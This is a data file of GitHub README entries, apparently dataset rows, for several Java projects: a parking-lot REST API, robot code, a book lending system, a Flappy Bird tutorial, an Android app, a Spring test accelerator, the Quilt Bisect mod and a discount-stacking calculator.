      <li><b>UserController:</b> APIs for managing user information, including retrieving user information by ID for both <b>admins</b> and <b>drivers</b>.</li>
      <li><b>VehicleController:</b> APIs for managing vehicles, including assigning a vehicle to a user and retrieving parking details of a vehicle handled with <b>drivers</b>.</li>
    </ul>
  </li>
</ul>

### Explore Rest APIs

<table style=""width:100%"">
  <tr>
      <th>Method</th>
      <th>Url</th>
      <th>Description</th>
      <th>Request Body</th>
      <th>Header</th>
      <th>Valid Path Variable</th>
      <th>Request Param</th>
      <th>No Path Variable</th>
  </tr>
  <tr>
      <td>POST</td>
      <td>/register</td>
      <td>Register a new user (Admin and Driver)</td>
      <td>SignupRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>POST</td>
      <td>/login</td>
      <td>Login user (Admin and Driver)</td>
      <td>LoginRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
      <td>POST</td>
      <td>/refreshtoken</td>
      <td>Refresh token (Admin and Driver)</td>
      <td>TokenRefreshRequest request</td>
      <td></td>
      <td></td>
      <td></td>
      <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/logout</td>
    <td>Logout user (Admin and Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/parks/userId/{userId}/check-in</td>
    <td>Check in to a park (Driver)</td>
    <td>ParkCheckInRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{userId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/parks/userId/{userId}/check-out</td>
    <td>Check out from a park (Driver)</td>
    <td>ParkCheckOutRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{userId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/parking-area</td>
    <td>Create a new parking area (Admin)</td>
    <td>ParkingAreaCreateRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/id/{parkingAreaId}</td>
    <td>Get a parking area by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/name/{name}</td>
    <td>Get a parking area by name (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{name} - Non-empty string</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/parking-area/income</td>
    <td>Get daily income for a parking area (Admin)</td>
    <td>date - Date in dd-MM-yyyy format<br>parkingAreaId - String</td>
    <td>Authorization header with Bearer token</td>
    <td></td>
    <td>parkingAreaId - Valid UUID , date - Valid Date</td>
    <td></td>
  </tr>
  <tr>
    <td>DELETE</td>
    <td>/parking-area/{parkingAreaId}</td>
    <td>Delete a parking area by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>PUT</td>
    <td>/parking-area/{parkingAreaId}</td>
    <td>Update a parking area by ID (Admin)</td>
    <td>ParkingAreaUpdateRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{parkingAreaId} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/users/user/{user-id}</td>
    <td>Get user information by ID (Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{user-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/users/admin/{admin-id}</td>
    <td>Get admin information by ID (Admin)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{admin-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>POST</td>
    <td>/vehicles/assign/{user-id}</td>
    <td>Assign a vehicle to a user (Driver)</td>
    <td>VehicleRequest request</td>
    <td>Authorization header with Bearer token</td>
    <td>{user-id} - Valid UUID</td>
    <td></td>
    <td></td>
  </tr>
  <tr>
    <td>GET</td>
    <td>/vehicles/get-parking-detail/{licensePlate}</td>
    <td>Get parking details of a vehicle (Driver)</td>
    <td></td>
    <td>Authorization header with Bearer token</td>
    <td>{licensePlate} - String</td>
    <td></td>
    <td></td>
  </tr>
</table>


---
### Technologies


- Java 17
- Spring Boot 3.0
- Spring Security
- JWT
- Restful API
- Lombok
- Maven
- Junit5
- Mockito
- Integration Tests
- Docker
- Docker Compose
- CI/CD (Github Actions)
- Prometheus and Grafana
- Postman
- Actuator
- Open Api (Swagger 3)
- Liquibase

---
### Postman

```
Import postman collection under postman_collection folder
```

---
### Open Api (Swagger 3)

```
http://localhost:1222/swagger-ui/index.html
```

---
### Prerequisites

#### Define Variable in .env file

```
DATABASE_USERNAME={DATABASE_USERNAME}
DATABASE_PASSWORD={DATABASE_PASSWORD}
PARKING_LOT_LIQUIBASE_ENABLE_DROP_FIRST=true
```

---
- Maven or Docker
---


### Docker Run
The application can be built and run by the `Docker` engine. The `Dockerfile` has multistage build, so you do not need to build and run separately.

Please follow directions shown below in order to build and run the application with Docker Compose file;

```sh
$ cd parkinglot
$ docker-compose up -d
```

If you change anything in the project and run it on Docker, you can also use this command shown below

```sh
$ cd parkinglot
$ docker-compose up --build
```

---
### Maven Run
To build and run the application with `Maven`, please follow the directions shown below;

```sh
$ cd parkinglot
$ mvn clean install
$ mvn spring-boot:run
```

---
### Docker Image Location

```
https://hub.docker.com/repository/docker/noyandocker/parkinglot/general
```

---
### Prometheus 
To open `Prometheus` running on Docker as Image , please go to the link shown below. 
Its screenshot is displayed in the Screenshots part.
```
http://localhost:9090
```

---
### Grafana 
To open `Grafana` running on Docker as Image , please go to the link shown below. 
Its screenshots is displayed in the Screenshots part.
```
http://localhost:3000
```

---
### Screenshots

<details>
<summary>Click here to show the screenshots of project</summary>
    <p> Figure 1 </p>
    <img src =""screenshots/screenshot_1.PNG"">
    <p> Figure 2 </p>
    <img src =""screenshots/screenshot_2.PNG"">
    <p> Figure 3 </p>
    <img src =""screenshots/screenshot_3.PNG"">
    <p> Figure 4 </p>
    <img src =""screenshots/screenshot_4.PNG"">
    <p> Figure 5 </p>
    <img src =""screenshots/screenshot_5.PNG"">
    <p> Figure 6 </p>
    <img src =""screenshots/screenshot_6.PNG"">
    <p> Figure 7 </p>
    <img src =""screenshots/screenshot_7.PNG"">
    <p> Figure 8 </p>
    <img src =""screenshots/screenshot_8.PNG"">
    <p> Figure 9 </p>
    <img src =""screenshots/screenshot_9.PNG"">
    <p> Figure 10 </p>
    <img src =""screenshots/screenshot_10.PNG"">
    <p> Figure 11 </p>
    <img src =""screenshots/screenshot_11.PNG"">
    <p> Figure 12 </p>
    <img src =""screenshots/screenshot_12.PNG"">
    <p> Figure 13 </p>
    <img src =""screenshots/screenshot_13.PNG"">
    <p> Figure 14 </p>
    <img src =""screenshots/screenshot_14.PNG"">
    <p> Figure 15 </p>
    <img src =""screenshots/screenshot_15.PNG"">
    <p> Figure 16 </p>
    <img src =""screenshots/screenshot_16.PNG"">
    <p> Figure 17 </p>
    <img src =""screenshots/screenshot_17.PNG"">
    <p> Figure 18 </p>
    <img src =""screenshots/screenshot_18.PNG"">
    <p> Figure 19 </p>
    <img src =""screenshots/screenshot_19.PNG"">
    <p> Figure 20 </p>
    <img src =""screenshots/prometheus_1.PNG"">
    <p> Figure 21 </p>
    <img src =""screenshots/grafana_1.PNG"">
    <p> Figure 22 </p>
    <img src =""screenshots/grafana_2.PNG"">
    <p> Figure 23 </p>
    <img src =""screenshots/grafana_3.PNG"">
    <p> Figure 24 </p>
    <img src =""screenshots/grafana_4.PNG"">
    <p> Figure 25 </p>
    <img src =""screenshots/grafana_5.PNG"">
    <p> Figure 26 </p>
    <img src =""screenshots/grafana_6.PNG"">
    <p> Figure 27 </p>
    <img src =""screenshots/grafana_7.PNG"">
    <p> Figure 28 </p>
    <img src =""screenshots/grafana_8.PNG"">
    <p> Figure 29 </p>
    <img src =""screenshots/grafana_9.PNG"">
</details>

### Contributors

- [Sercan Noyan Germiyanoğlu](https://github.com/Rapter1990)
- [Muhammet Oğuzhan Aydoğdu](https://github.com/moaydogdu)
- [Mehmet Şeymus Yüzen](https://github.com/mehmetseymusyuzen)
- [Harun Yusuf Ekşioğlu](https://github.com/artfulCoder98)
",0,0,1,
frc-862/rhapsody,main,"# Rhapsody

<p align = ""Center"">
   <img src=""https://github.com/frc-862/Rhapsody/assets/92895537/05e5b36d-0b52-47e8-891f-d0e9886f86b1"" width=554 height=240 />
   <img src=""https://cdn.discordapp.com/attachments/1201511131370508331/1201511198080909393/IMG_3730.png?ex=65d35000&is=65c0db00&hm=1c2111ba0e1921cb1f15ecc6da83d6418ce2d2d9720ad434f2483d6682e6c208&"" width=768 height=576/>
</p>
 
<h4 align = ""Center"">
  2024 Crescendo robot code for our robot, Rhapsody
</h4>
",5,16,13,GPL-3.0
LearnCodeWithDurgesh/top-spring-boot-annotations,main,,0,1,1,
caolib/book_management_system,master,"[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=cascadia+code&size=38&duration=3500&pause=1000&color=00ADFF&center=true&vCenter=true&random=false&width=1000&height=100&lines=Book+lending+management+system;图书借阅管理系统)](https://git.io/typing-svg)

&emsp;&emsp;

![springboot](https://img.shields.io/badge/springboot-v3.0.9-%236DB33F?style=flat&logo=springboot&logoColor=236DB33F&labelColor=white)
![maven](https://img.shields.io/badge/Maven-v3.9.5-blue?style=flat&logo=apachemaven&logoColor=red&labelColor=white)
![mybatisplus](https://img.shields.io/badge/MybatisPlus-v3.5.3.1-red?style=flat&labelColor=white)
![mysql](https://img.shields.io/badge/MySQL-v8.2.0-blue?style=flat&logo=mysql&logoColor=blue&labelColor=white)
![redis](https://img.shields.io/badge/Redis-v7.0.12-red?style=flat&logo=redis&logoColor=%23DC382D&labelColor=white)
![GitHub Release](https://img.shields.io/github/v/release/tankingcao/java_design?include_prereleases&sort=date&display_name=release&style=flat&labelColor=red&cacheSeconds=3600)
![下载量](https://img.shields.io/github/downloads/caolib/book_management_system/total.svg)

<!-- 
![GitHub License](https://img.shields.io/github/license/caolib/book_management_system?style=flat)
![opened issues](https://img.shields.io/github/issues/caolib/book_management_system?color=red&cacheSeconds=3600)
![closed issues](https://img.shields.io/github/issues-closed/caolib/book_management_system?color=green&cacheSeconds=3600)
![GitHub commit activity](https://img.shields.io/github/commit-activity/y/caolib/book_management_system?labelColor=red)
-->

使用`springboot+mybatis-plus`框架制作的一个简单的图书借阅管理系统后台服务器

> [!important]
>
> **项目采用前后端分离开发，这是后端项目，对应的[前端项目地址](https://github.com/caolib/vue3-vite)，注意相关技术栈版本不要相差太大**

> [!caution]
>
> - **最近更新中因为使用`redis`二次校验token实现token主动过期，`redis`变成必需项!!!**
> - **在[发行版](https://github.com/caolib/book_management_system/releases)的资源中有此项目对应的数据库结构的`sql`文件**

> [!tip]
> - 使用前先使用maven下载相关依赖，建议使用IDEA编译器，捆绑了maven，可以直接使用
> - 注意前后端一般是同时修改的，必须匹配版本，没有特别需求（不想使用redis）直接使用最新的

## 快速开始

### 1.参照注释修改配置文件

路径：`src/main/resources/application.yml`

```yml
# 项目启动端口，默认8080，修改后前端中的请求地址也要对应修改
server:
  port: 8080

# mybatis-plus配置
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: true # 下划线命名转驼峰
  type-aliases-package: com.clb.domain # 别名扫描包
  mapper-locations: classpath:mapper/*.xml # mapper文件扫描

spring:
  # mysql
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/java_design?serverTimezone=Asia/Shanghai
    # 注意修改用户名和密码为你自己的
    username: root
    password: 123456
    type: com.alibaba.druid.pool.DruidDataSource

  # redis
  data:
    redis:
      # 修改host和密码为你的，如果没有密码则删除password项，redis默认没有密码
      host: localhost
      password: 123456
      port: 6379
      database: 0
      timeout: 5000ms
  cache:
    type: redis  
    redis:
      time-to-live: 3600000 # 缓存过期时间,单位ms(此处一小时)

  # 热重载排除advice文件
  devtools:
    restart:
      additional-exclude: com/clb/util/Advice.class
  # 支持控制台ansi颜色输出(使用java命令行部署时),如果乱码则删除下面3行
  output:
    ansi:
      enabled: always
      
# 日志
logging:
  level:
    com.clb: debug
  pattern:
    dateformat: MM-dd HH:mm:ss.SSS

```

### 2.启动项目

使用编译器一键启动项目(前提:mysql和redis数据库配置正确且已经启动)

## 项目目录结构

- `src/main/java/com/clb/`
  - `config`：配置文件
  - `constant`：枚举字段
  - `controller`：表现层
  - `domain`：实体类等
  - `exception`：异常类
  - `handle`：处理器类
  - `interceptor`：拦截器类
  - `mapper`：持久层
  - `service`：业务层
  - `util`：工具类
- `src/main/resources`
  - `mapper`：映射文件mapper
  - `application.yml`：配置文件
  - `banner.txt`：spring项目启动logo
- `src/test/`：测试类
- `pom.xml`：依赖管理

## 打包使用

> 将项目使用maven打成jar包后可以通过命令行执行jar包

```cmd
java -jar .\book-1.0.0.RELEASE.jar
```

> 可以修改端口号

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081
```

> ~也可以关闭redis~

```cmd
java -jar .\book-1.0.0.RELEASE.jar --server.port=8081 --spring.cache.type=none
```

> [!tip]
> 此项目对应的[微服务版本](https://github.com/caolib/cloud-book)

## 提交分析
![Alt](https://repobeats.axiom.co/api/embed/fff6dbaa9aa86bbe35a974910b89f89dd10a3383.svg ""Repobeats analytics image"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=caolib/book_management_system,caolib/vue3-vite&type=Timeline)](https://star-history.com/#caolib/book_management_system&caolib/vue3-vite&Timeline)
",1,0,1,MIT
ImKennyYip/flappy-bird-java,master,"# [Flappy Bird](https://youtu.be/Xw2MEG-FBsE)
- Coding Tutorial: [https://youtu.be/jj5ADM2uywg](https://youtu.be/Xw2MEG-FBsE)

In this tutorial, you will learn to create the flappy bird game with the built-in java awt/swing graphics library.

Throughout the tutorial, you will learn how to create the game loop, create a jframe and jpanel, draw images on the jpanel, add click handlers to make the flappy bird jump, randomly generate pipes and move them across the screen, detect collisions between the flappy bird and each pipe, and add a running score. 

[How to setup Java with Visual Studio Code](https://youtu.be/BB0gZFpukJU)

![flappybird-ss](https://github.com/ImKennyYip/flappy-bird-java/assets/78777681/8b445d66-ab36-4d40-a6ac-ad501d41ed32)
",0,0,1,
Pulikovskyy/fixitnow,main,"# FixItNow! Android Studio Project

This repository contains the source code for the ""FixItNow!"" Android Studio project.

## Getting Started

These instructions will get you a copy of the project up and running on your local machine for development and testing purposes.

### Prerequisites

- Android Studio 

### Installation

1. Clone this repository to your local machine using `git clone https://github.com/yourusername/your-repository-name.git`
2. Open Android Studio.
3. Click on 'File' -> 'New' -> 'Import Project'.
4. Navigate to the directory where you cloned the repository, select the ""App-maint"" folder, and click 'OK'.
5. Android Studio will import the project and build it automatically.

### Android App

1. In an Android phone, use this link: https://drive.google.com/drive/folders/1naYpaSMDk2LM4ekRm5bAH-_m0ZYCQZVS?usp=drive_link
2. Download the App: Once you open the link, you will see a list of files. Look for the APK file, which is the Android application package file that you need to install the app. Click on the file to download it.
2. Install the App: After the APK file is downloaded, open it to start the installation process. You might need to allow your device to install apps from unknown sources. Android usually prompts and redirects you to the security settings page. If it does not,  manually go to your device’s security settings and enable the ‘Unknown Sources’ option.
4. Open the App (Android only): Once the app is installed, you can find it in your device’s app drawer. Tap on the app icon to open it.


## Running the App

After successfully importing the project into Android Studio, you can run the app by clicking on the 'Run' button (a green play icon) in the toolbar.
",0,0,1,
liubingmx/fast-spring-test,main,"Languages： English | [中文](README_CN.md)
# fast-spring-test
The unit test speed-up tool draws on spring test's support for integration testing, so that unit tests can also reuse the spring container without restarting the spring container to achieve the purpose of rapid unit testing. It supports multiple test engines junit4, junit5, testNG, etc.
  
## Architecture

![Architecture](https://github.com/liubingmx/fast-spring-test/blob/main/doc/architecture.png)

## Effects


https://github.com/liubingmx/fast-spring-test/assets/20813546/00874ed7-e1b6-483c-8d3a-e40e46116142

- The first run requires starting the running environment, which takes a long time. After the second run, the container can be reused, and the unit test execution time can be down to the millisecond level. There is no need to restart when adding a single test case. The test can be hot loaded and executed directly.

## Getting started

### Maven dependency

```xml
<properties>
    <fast.spring.test.version>1.0.3</fast.spring.test.version>
</properties>

<dependencies>
    <dependency>
        <groupId>cn.net.fasttest</groupId>
        <artifactId>fast-spring-test</artifactId>
        <scope>test</scope>
        <version>${fast.spring.test.version}</version>
    </dependency>
</dependencies>
```

### Add test entry

```java
public class FastSpringApplicationTests {

  @Test
  public void test() {

    System.out.println(""test..."");
    Assertions.assertTrue(true);
  }

  public static void main(String[] args) {
    Configuration configuration = Configuration.ConfigurationBuilder.builder()
            .prompt(""fast-spring-test-demo => "")
            .build();
    FastSpringTest.run(configuration);
  }
}
```
IDE run FastSpringApplicationTests, execute the following command to start testing
```
# run com.xx.class#method
run cn.net.fasttest.FastSpringApplicationTests#test
# or
cn.net.fasttest.FastSpringApplicationTests#test
```
### All Commands
- run : Run test case,example:
    - run cn.net.fasttest.FastSpringTests#test

- show : Show the results of the last run

- rerun : Rerun last test case

- history : Show the most recently executed command

- help : Print help information for all commands

- quit : Quit.

## Contributing

- We welcome and encourage you to contribute to our projects. If you have any questions, suggestions, or want to contribute code, please contact us via email, GitHub issues, or submit a PR directly. Your participation will make this project even better!

## Reporting bugs

- [GitHub Issue](https://github.com/liubingmx/fast-spring-test/issues/new)

## License

fast-spring-test is under the Apache 2.0 license. See the [Apache License 2.0](https://www.apache.org/licenses/LICENSE-2.0) file for details.",6,0,1,
anonymous123-code/quilt-bisect,main,"# Quilt Bisect

A Quilt mod & loader plugin for finding mods responsible for issues using a search algorithm derived from binary search. This includes n-way mod incompatibilities.

## Usage

- This project uses Loader Plugins, `-Dloader.experimental.allow_loading_plugins=true` needs to be added to your JVM arguments.
- Put this mod into your mods folder
- If your game crashes, a dialog will open asking if you want to bisect, else click the start bisect button at the top of your screen, and you will be prompted to give your issue a name. 
- The game will automatically restart. Try to reproduce the issues you had before.
  - If everything is fine, click the `No Issue` button
  - If you have an issue click the `Manual Issue` button, and select the issue you are having or create a new one
    - Note that it is recommended to keep the number of issues in one bisect down, and instead run multiple bisects with previous fixes applied. See [Bisecting multiple issues at once](#bisecting-multiple-issues-at-once)
- once an issue is isolated, bisect will verify the solution(s) and continue bisecting the other issues
- once bisect is done, it will provide a summary of issues and solutions encountered. Please treat those with care though, [due to the way bisect works](#loading-the-right-mod-set)

### Configuring
The file `<config>/quilt_bisect/main.json` contains most things a user may want to configure, see [MainConfig.java](/src/main/java/io/github/anonymous123_code/quilt_bisect/shared/MainConfig.java) for now.

The file `<config>/quilt_bisect/active_bisect.json` contains information about the active bisect, including the settings, all tried mod sets and their respective log, and issue information.

The files `<config>/quilt_bisect/modSet.txt`, `<config>/quilt_bisect/sections.txt`, and `<config>/quilt_bisect/lastActiveJoin.txt` contain internal information and shouldn't be modified.

## How does it work
### Bisecting multiple issues at once
While bisecting multiple issues works, there are a few assumptions bisect makes that are essential when multiple issues are present:
- Only removing a mod can fix an issue, not adding one 
  - A common example for this would be indium, which fixes compatibility issues between sodium and other mods, if it wouldn't be declared by the other mods involved
- There is a constant priority order between issues 
  - If a subset B of a mod set with issue A has an issue different from issue A, issue A won't occur on any subset of B. This means that issues (even if marked by the user) must always be tested for in the same order

### Automatically mark things as working
When starting a new bisect, you can configure bisect to
- automatically join a world, server, realm, or the last joined one (Note that realms rely on ids and not on names)
- automatically accept a mod set as working after a given time
  - The time is in 1/20 seconds, and will start on world join if auto join is active, else when the title screen shows. If in single player, it will also wait for enough ticks to pass
- automatically run commands or sending chat messages after auto joining.
  - It will be treated as if you sent them from chat, and also work with client side commands
- disable world saving
  - This is to help reproduction of issues where the state of the world is relevant. No single player world will be changed after a relaunch if this is active. It also allows for testing content mods
  - For maximum compatibility it is currently implemented by making a backup of the worlds folder and resetting the worlds that have been backed up to the stored state before launch if active

### Handling crashes
Being a loader plugin, bisect hooks into the Quilt's loader process at an incredibly early stage.
There, it can create a new process that is actually running the game, and wait for that process to end.
After that bisect checks if minecraft crashed by searching for a new crash log, copies the latest.log, and updates `config/quilt_bisect/active_bisect.json`.
(if no bisect is active and it crashed it asks if a new one should be started)
If minecraft didn't quit normally (either through a crash or through the bisect menu) and a bisect is active, the parent process will restart the game.
[Behind the scenes](src/main/java/io/github/anonymous123_code/quilt_bisect/plugin/BisectPluginProcessManager.java) there is a lot more stuff going on making sure that for example killing the parent or child process makes them  behave as expected.

### Detecting issues
Bisect will
- [Handle crashes](#handling-crashes)
- (TODO) Check for log messages using regexes (if possible)
- Rely on user input

### Selecting the next mod set to test
Bisect works using an extended version of binary search:
- First, select the smallest mod set with an (unfixed) issue
- For each section of that mod set(see last row)
  - If a section simply includes one mod, that mod is required and no more work needs to be done on that section
  - Divide that section into half
  - Check those halves
    - if one has an issue, it becomes a part of the issue mod set in the next iteration
    - if all halves are working this means that in both halves are mods required for the issue to arise
      - => store those halves as separate sections and bisect those like in step 3
- if all sections only contain one element, a minimal reproduction has been isolated. Mark the corresponding issue as fixed with the resulting mod set and debug the next issue, with one of the current mods removed
- Once all of this is done, prompt the user to select which mods are to be removed

### Loading the right mod set
One of the main problems such a bisect algorithm faces are dependencies.
Ideally, a bisect method would be aware of dependencies and bisect based on those.
However, this would immensely inflate the complexity of the algorithm, and this project is complex enough right now.

Instead, Quilt Bisect simply ignores dependency in its search algorithm and provides all mods to quilt loader.
However, it only force-loads mods in the mod set (this is what happens to mods in your mods folder) and provides the other mods as optional mods which are only loaded when a dependency requires it.
While solving the dependency issue, it has a few implications:
- If required, a mod not in the mod set still can be loaded
- This means that it can happen that when bisect identifies a minimal reproduction, that reproduction set actually only includes a mod which depends on the real culprit
- This means that the mod set *can not show* which mod is at fault and that before blaming a mod some better tests must occur

## Development

For testing, I also recommend [Quilt Crasher](https://github.com/anonymous123-code/quilt-crasher), which I developed to enable testing of this kind of mod.

## Licensing

While the code is ARR, this is only to prevent ports to other mod loaders or low-effort copies. Feel free to copy parts of the code for your mod. If your mod does similar things to this mod, credit me. You can also ask for me for permission. If it's not a port to another mod loader, I'll likely agree.

## Credit

`PluginLogger`, `MinecraftServerMixin` and `GracefulTerminator` were mostly taken from https://github.com/comp500/ModVote.
`BisectPluginProcessManager` also contains large parts of `ModvotePlugin` from that repo.
All of these are under the [MIT license](external-licenses/Modvote-License) (by comp500)

`IconStore` contains code from https://github.com/TerraformersMC/ModMenu, specifically from `FabricIconHandler` and `FabricMod#getIcon`. `java_icon.png`, `minecraft_icon.png` and `unknown_icon.png` were also taken from there. Mod Menu is also licensed under the [MIT license](external-licenses/Modmenu-License) (by Prospector)
",5,2,4,
GaoSSR/OnePRO,main,"<div align=center>
  <img width=""365"" src=""./READMEIMG/Project-Name.png"" />
</div>


<div align=""center"">
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%9E%84%E5%BB%BA"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%B5%8B%E8%AF%95"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/appveyor/build/gruntjs/grunt?label=%E6%96%87%E6%A1%A3"" /></a>
  <a href=""javascript:;""><img src=""https://img.shields.io/badge/%E5%BC%80%E6%BA%90%E5%8D%8F%E8%AE%AE-Apache-brightgreen"" alt=""License""></a>
 </div>
<br />

## 轻量级算法驱动优惠叠加器

#### RT：
 <img width=""1000"" src=""./READMEIMG/211690962797_.pic.jpg"" />


#### 背景：

优惠是推动消费者转化的关键因素，它在激发用户消费行为上起着核心作用。目前市场上的优惠策略主要涵盖了各种活动（例如拼多多的“砍一刀”，天猫农场的互动，新用户的首次购买，复购，积分等）和优惠券（如折扣券，代金券，商品券，买一赠一等）。然而，这些复杂的优惠规则使得用户在计算优惠叠加的顺序时感到困扰。这可能导致用户在面对多重优惠时降低购买商品的欲望，尤其是当他们参与了多个活动并持有多个优惠券时，这种情况更为明显。

优惠的计算顺序可以分为平行式和渐进式，其中平行式优惠之间没有相互依赖关系，而渐进式优惠之间则存在依赖关系，即下一个优惠的触发取决于上一个优惠的实施结果。

设想小晴消费了100元，她手头有一张7折优惠券和一张满100元减30元的优惠券。这两个优惠券的使用顺序可能会产生不同的效果，则这2个优惠券的使用顺序有以下两种情况：

<img src=""./READMEIMG/image（1）.png"" width=""75%"">

`OnePRO`采用了一系列新颖的算法，实现了高效求解优惠排列的最优解。

<img src=""./READMEIMG/image（2）.png"" width=""100%"">

#### 核心计算类 Permutation&lt;T extends GoodsItem&gt;

`Permutation`是一个重要的抽象类，作为`OnePRO`的核心，它采用了多种优化策略来确保高性能，这些策略的运用旨在提升计算效率和降低资源消耗，这些策略包括：

- 预存的排列数结果集

之所以采用这种设计，是因为在业务场景中，我们需要频繁进行排列计算。对于给定长度的序列，其排列结果是固定的。在`Permutation`类中，`PERMUTATIONS`属性存储了7以内的排列数结果集。由于这里使用了`Byte`来存储数据，因此占用的内存空间非常小，这有助于提高性能并降低内存消耗。

```Java
private final static Map<Integer,Collection<List<Byte>>> PERMUTATIONS = Maps.newHashMap();

```
这个动作在类加载完成时执行，如果觉得7不合适，对7不满意，可以通过调整`SUPPORTEDSIZE`的大小来满足业务和性能的需求。

我们在实现中经过测试和调整，确定了7是一个相对平衡的参数，它兼顾了业务与性能，当然，根据实际需求，大家可以根据自己的情况来调整这个参数。

```Java
public final static int SUPPORTEDSIZE = 7;

static{
      //前置计算 1-SUPPORTEDSIZE 之间所有排列组合
    for(byte i=1;i<=SUPPORTEDSIZE;i++){
       PERMUTATIONS.put((int)i,Collections2.permutations(IntStream.range(0,i).boxed().map(x->(byte)x.intValue()).collect(Collectors.toList())));
      }
  }

```

- $A_n^3$级别缓存

相对于传统的`Key-Value`结构，解决 $A_n^n$问题的缓存需要进行特殊设计，对于一个优惠集合而言， $A_n^3$意味着需要缓存*n*×(*n*−1)×(*n*−2)条数据。当n=7时，需要缓存210条数据。为了在内存大小和缓存带来的性能收益之间取得平衡， $A_n^3$是最合适的级别。

`Permutation`类通过其成员变量`cache`实现了高性能缓存。

```Java
private final Map<Integer, CalcState<T>> cache = Maps.newHashMap();
```
你或许已经注意到，`cache`的键值使用的是`Integer`类型。在大多数情况下，我们更倾向于使用`String`类型，但在需要进行大量计算的场景中，比如在万次计算的场景下，String字符串的拼接却成了性能瓶颈。

为了实现高性能的键生成，`Permutation`采用了独特的方法。它通过位移对`Byte`数组的前三个字节进行扰动，以确保每个键的唯一性，同时提升性能。

```Java
private static Integer calcKey(List<Byte> a){
       return  a.size()>=3?(a.get(0) << 6)+ (a.get(1) << 3) + a.get(2):0;
}
```

`Permutation`提供了保存点来实现  $A_n^3$ 级别缓存，`CalcState` 记录了计算到第3步的状态，包括当前订单优惠金额和计算过程、已享用优惠的商品等，这些属性的保存和回放`Permutation`已经帮你做好了，`Permutation`额外提供了抽象的保存和回放方法来满足你的个性化诉求。

```Java
   /**
     * 业务将状态记录到保存点
     * @param state 保存点对象
     */
    protected abstract void makeSnapshot(CalcState<T> state,DiscountContext<T> context);

    /**
     * 业务返回保存点状态
     * @param state 保存点对象
     */
    protected abstract void backToSnapshot(CalcState<T> state,DiscountContext<T> context);
```

在优惠计算中，存在一个优先级规则，即优惠计算是有优先级的，需要确保属性`calculateGroup`值较小的优惠先行计算。当发生`backToSnapshot`时，我们需要额外检查缓存中最后一个优惠与当前正准备要计算的优惠之间的关系，如果不满足特定条件，则直接终止计算，直接跳出。而`checkIfWakeUpJump`方法会在缓存被使用后立即判断是否需要继续下去。

#### 上下文类 DiscountContext&lt;T extends GoodsItem&gt;

`DiscountContext`是上下文，也是`Permutation`的成员变量，`DiscountContext`同样包含很多优化策略：

- CalcStage数组

在变更最频繁也是最重要的计算步骤对象`CalcStage`使用数组存储，该数组随着上下文创建而创建，在`Permutation`中使用

```Java
Arrays.fill(arr,null);
```

将该数组清空并让它投入下一次计算，这样一次全排列过程中，数组只会被创建一次，避免了频繁创建数组带来的性能损耗。

- 预计算

`DiscountContext`的初始化是通过静态的`create`方法完成的，该方法将商品与优惠绑定在一起，同时执行一些用户自定义的逻辑，我们称之为“预计算”，预计算的结果被保存在`DiscountContext`的`preCompute`属性中，以便在后续的计算中直接取用，这种方法避免了在后续的高速迭代中重复执行相同的操作，如商品分组和、求和等，从而提高了计算效率。

#### 预计算 PreCompute&lt;T extends GoodsItem&gt;

预计算提供了接口，要使用预计算首先需要实现PreCompute接口

```Java
public interface PreCompute<T extends GoodsItem> {
    /**
     * 判断符合条件的活动类型，符合才会执行preComputeItems
     */
    Set<String> matchTypes();

    /**
     * 对商品做一些复杂集合操作
     * @param items 当前参与优惠的商品
     * @param discount 当前优惠
     * @param preCompute 存储计算的结果
     */
     void preComputeItems(List<T> items, DiscountWrapper discount, Map<String,Object> preCompute);
}
```

此外需要在资源目录下建立`calculator-core.properties`文件，配置内容如下

```Java
precompute.path=你要扫描的包
```
`PreComputeHolder`将处理所有的`PreCompute`实现类，只有`matchTypes`匹配的情况下，才会执行`preComputeItems`方法。

```Java
public class PreComputeHolder {
    public static Set<PreCompute> COMPUTES= Sets.newHashSet();
    private final static String PATH = ""precompute.path"";

    static{
        Properties properties = new Properties();
        try {
              properties = PropertiesLoaderUtils.loadProperties(new FileSystemResource(Objects.requireNonNull(PreComputeHolder.class.getClassLoader().getResource(""calculator-core.properties"")).getPath()));
        } catch (Exception ignore) {
        }
        String path = properties.getProperty(PATH);
